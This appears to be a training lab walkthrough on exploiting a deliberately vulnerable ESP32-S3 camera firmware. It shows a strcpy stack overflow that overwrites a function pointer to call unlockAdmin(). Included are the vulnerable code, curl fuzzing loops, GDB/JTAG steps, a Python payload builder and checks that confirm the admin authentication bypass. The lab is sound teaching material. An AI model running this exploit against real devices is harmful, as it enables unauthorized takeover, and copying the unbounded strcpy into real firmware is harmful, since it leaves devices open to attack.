# L11: Buffer Overflow - Function Pointer Hijack

## Goal
Exploit a stack buffer overflow to corrupt a function pointer, redirecting execution to an admin unlock function. You must use GDB to find offsets and the target function address.

## Background

**Real buffer overflow exploitation:**
1. Overflow a buffer to corrupt adjacent stack data
2. Overwrite a function pointer with address of target function
3. When the corrupted pointer is called, execution is hijacked
4. No artificial "if corrupted" checks - the call happens naturally

**What you need to find via reverse engineering:**
- Buffer size and offset to function pointer
- Address of `unlockAdmin()` function in memory
- Correct byte order (little-endian on ESP32)

## Lab Walkthrough

### Step 1: Identify the Vulnerability

Send progressively longer inputs to `/camera?exposure=` and observe device behavior. The handler uses `strcpy` into a 64-byte stack buffer adjacent to a function pointer.

```cpp
// From CameraDevice_Web.cpp - handleCamera()
struct {
    char buffer[64];
    void (*callback)(void);
} __attribute__((packed)) vuln;

vuln.callback = defaultExposureHandler;
strcpy(vuln.buffer, exposure.c_str());  // No bounds check! Overflow at byte 65+
vuln.callback();  // Calls the (possibly corrupted) function pointer
```

```bash
# Normal request
curl "http://192.168.4.1/camera?exposure=auto"

# Test increasing lengths
for i in 50 60 70 80 90; do
  echo "Testing $i bytes..."
  curl "http://192.168.4.1/camera?exposure=$(python3 -c "print('A'*$i)")" 2>/dev/null
  echo
done
```

If the device crashes or behaves oddly with long input, there's likely a buffer overflow.

### Step 2: Find Target Function Address

Locate `unlockAdmin()` in the firmware so you know what address to overwrite the function pointer with.

If you have the build ELF (from PlatformIO), you can look up symbols directly:

**Note:** `xtensa-esp32s3-elf-*` tools are Xtensa cross-tools for ESP32-S3, not standard Linux binaries. See the main [labs README](../LABS.md) for installation instructions.

```bash
# With the build ELF (has full symbol table):
xtensa-esp32s3-elf-nm .pio/build/M5CoreS3/firmware.elf | grep unlockAdmin

# Or with objdump:
xtensa-esp32s3-elf-objdump -t .pio/build/M5CoreS3/firmware.elf | grep unlockAdmin
```

If you only have the extracted `.bin` from L04, convert it to ELF first:

```bash
# Convert raw bin to ELF (no symbols, but allows disassembly)
python3 ../L04-firmware-extraction/tools/bin2elf.py app.bin firmware.elf

# The recovered ELF has no symbol table, so you need to find unlockAdmin
# by searching for its string references in Ghidra (search for "ADMIN UNLOCK"
# or "Admin mode unlocked" and follow XREFs to the function)
```

Note the address (e.g., `0x4200D374`).

### Step 3: Analyze Stack Layout with GDB

Attach GDB via JTAG to determine the exact offset from the 64-byte `exposure` buffer to the adjacent function pointer.

```bash
# Start OpenOCD for JTAG debugging
openocd -f board/esp32s3-builtin.cfg

# In another terminal, connect GDB (use the build ELF for symbols, or the recovered ELF)
xtensa-esp32s3-elf-gdb .pio/build/M5CoreS3/firmware.elf
(gdb) target remote :3333
```

Disassemble the vulnerable function:

```gdb
(gdb) info functions handleCamera
(gdb) disassemble CameraDevice::handleCamera

# Look for:
# - Stack allocation size
# - Where buffer is located relative to SP
# - Where function pointer is stored
# - The CALLX instruction that calls the function pointer
```

### Step 4: Map Memory Layout

Set breakpoints and inspect live stack memory to confirm the buffer and function pointer locations.

```gdb
(gdb) break CameraDevice::handleCamera
(gdb) continue

# Trigger from another terminal:
# curl "http://192.168.4.1/camera?exposure=test"

# When breakpoint hits:
(gdb) info frame
(gdb) x/32xw $sp
(gdb) p &buffer
(gdb) p &exposureCallback
```

Calculate: `offset = &exposureCallback - &buffer`

### Step 5: Craft Exploit Payload

Build padding (to fill buffer) followed by `unlockAdmin()` address in little-endian.

```python
import struct

buffer_size = ???  # Found via GDB
target_addr = 0x4200D374  # unlockAdmin address

# Padding + address (little-endian)
payload = b'A' * buffer_size + struct.pack('<I', target_addr)
print(payload)
```

### Step 6: Execute Exploit

URL-encode the payload and send it. The HTTP parameter is passed directly to `strcpy`; when the handler calls the function pointer, it jumps to `unlockAdmin()`.

```bash
python3 -c "
import struct
import urllib.parse

offset = ???  # Your calculated offset
addr = 0x4200D374  # unlockAdmin address

payload = 'A' * offset + struct.pack('<I', addr).decode('latin-1')
print(urllib.parse.quote(payload))
"

# Send the exploit
curl "http://192.168.4.1/camera?exposure=<encoded_payload>"
```

### Step 7: Verify Exploitation

The `unlockAdmin()` function sets admin mode and switches the UI to the admin panel. Unlike the hardware bus overflow targets, there is no screen flash or audio - the effect is silent but immediately verifiable via HTTP.

**What happens on success:**
- Device enters admin mode (persists until reboot)
- UI switches to admin panel state
- All JWT-protected admin endpoints become accessible without a token

**Verify via HTTP:**

```bash
# Before exploit
curl -s -o /dev/null -w "%{http_code}" http://192.168.4.1/admin
# Expected: 401

# After exploit
curl -s -o /dev/null -w "%{http_code}" http://192.168.4.1/admin
# Expected: 200 (admin unlocked!)

# Confirm admin_mode in device status
curl -s http://192.168.4.1/status
# Look for: "admin_mode":true

# Access admin-only endpoints
curl -s http://192.168.4.1/admin/status
curl -s http://192.168.4.1/admin/nvs
# Both return data without requiring JWT
```

**Verify via serial:**

```bash
# Type whoami in the serial console
cores3-cam> whoami
# Expected: "admin" (was "user" before exploit)
```

## Impact

- **Arbitrary code execution** - attacker redirects control flow to any function in firmware
- **Authentication bypass** - admin mode unlocked without knowing the admin PIN
- **No mitigations** - ESP32-S3 has no ASLR, no stack canaries, and no DEP, making exploitation straightforward
- **Remote trigger** - exploitable over WiFi via a single HTTP GET request (no physical access required)
- **Persistent compromise** - once admin mode is unlocked, attacker has full device access until reboot

## Hints

**Hint 1: Finding the offset**

Use a pattern to find exact offset:
```gdb
# Send "AAAABBBBCCCCDDDD..." and see which bytes overwrite the pointer
(gdb) x/xw &exposureCallback
```


**Hint 2: Address format**

ESP32 is little-endian. Address `0x4200D374` becomes bytes `\x74\xD3\x00\x42`.


**Hint 3: Debugging crashes**

If device crashes, use GDB to see what address it tried to jump to:
```gdb
(gdb) info registers
(gdb) x/i $pc
```


## Success Criteria

- [ ] Found `unlockAdmin()` address via objdump/nm (in the `0x4200xxxx` range)
- [ ] Determined struct layout: 64-byte buffer + function pointer at offset 64
- [ ] Crafted URL-encoded payload: 64 bytes padding + 4-byte little-endian address
- [ ] Sent payload via `GET /camera?exposure=<payload>`
- [ ] **`/admin` returns 200** (was 401 before exploit)
- [ ] **`/status` shows `"admin_mode":true`**
- [ ] **Serial `whoami` shows `admin`**
- [ ] **Admin endpoints (`/admin/status`, `/admin/nvs`) accessible without JWT**

## References

- [CWE-121: Stack Buffer Overflow](https://cwe.mitre.org/data/definitions/121.html)
- [Function Pointer Overwrites](https://www.exploit-db.com/docs/english/28553-linux-classic-stack-buffer-overflow.pdf)
- [ESP32 Memory Layout](https://docs.espressif.com/projects/esp-idf/en/latest/esp32/api-guides/memory-types.html)
